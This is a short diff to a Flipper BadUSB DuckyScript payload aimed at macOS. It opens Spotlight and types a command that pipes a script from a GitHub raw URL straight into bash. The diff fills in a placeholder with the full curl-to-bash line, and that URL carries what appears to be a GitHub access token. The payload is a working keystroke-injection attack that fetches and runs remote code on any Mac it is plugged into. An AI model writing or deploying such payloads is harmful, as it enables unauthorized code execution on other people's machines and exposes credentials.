@@ -8,5 +8,5 @@ REM     Target: OSx
 
 GUI SPACE
 DELAY 500
-STRING dc=''; curl -sSL ... | bash
+STRING dc=''; curl -sSL https://raw.githubusercontent.com/bartanoren/FlipperBadUSB/main/OSx/Test/test.sh?token=GHSAT0AAAAAACXIC3MWBGTUDLOASHJM7HU2ZXBNUPQ | bash
 ENTER
